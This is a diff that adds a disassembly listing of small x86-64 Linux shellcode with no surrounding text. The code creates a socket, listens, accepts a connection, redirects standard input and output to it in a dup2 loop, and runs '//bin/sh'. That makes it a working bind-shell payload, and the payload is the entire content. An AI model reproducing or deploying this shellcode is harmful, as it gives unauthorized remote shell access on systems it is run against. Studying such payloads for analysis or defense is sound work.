@@ -1,0 +1,29 @@
+    0x00  4831f6         xor rsi, rsi                                                                                                                      
+    0x03  48f7e6         mul rsi                                                                                                                           
+    0x06  ffc6           inc esi                                                                                                                           
+    0x08  6a02           push 2                      ; 2                                                                                                   
+    0x0a  5f             pop rdi                                                                                                                           
+    0x0b  b029           mov al, 0x29                ; ')' ; 41                                                                                            
+    0x0d  0f05           syscall                                                                                                                           
+    0x0f  52             push rdx                                                                                                                          
+    0x10  5e             pop rsi                                                                                                                           
+    0x11  50             push rax                                                                                                                          
+    0x12  5f             pop rdi                                                                                                                           
+    0x13  b032           mov al, 0x32                ; '2' ; 50                                                                                            
+    0x15  0f05           syscall                                                                                                                           
+    0x17  b02b           mov al, 0x2b                ; '+' ; 43                                                                                            
+    0x19  0f05           syscall                                                                                                                           
+    0x1b  57             push rdi                                                                                                                          
+    0x1c  5e             pop rsi                                                                                                                           
+    0x1d  4897           xchg rax, rdi                                                                                                                     
+┌─> 0x1f  ffce           dec esi                                                                                                                           
+╎   0x21  b021           mov al, 0x21                ; '!' ; 33                                                                                            
+╎   0x23  0f05           syscall                                                                                                                           
+└─< 0x25  75f8           jne 0x1f                                                                                                                          
+    0x27  52             push rdx                                                                                                                          
+    0x28  48bf2f2f6269.  movabs rdi, 0x68732f6e69622f2f ; '//bin/sh'                                                                                       
+    0x32  57             push rdi                                                                                                                          
+    0x33  54             push rsp                                                                                                                          
+    0x34  5f             pop rdi                                                                                                                           
+    0x35  b03b           mov al, 0x3b                ; ';' ; 59                                                                                            
+    0x37  0f05           syscall
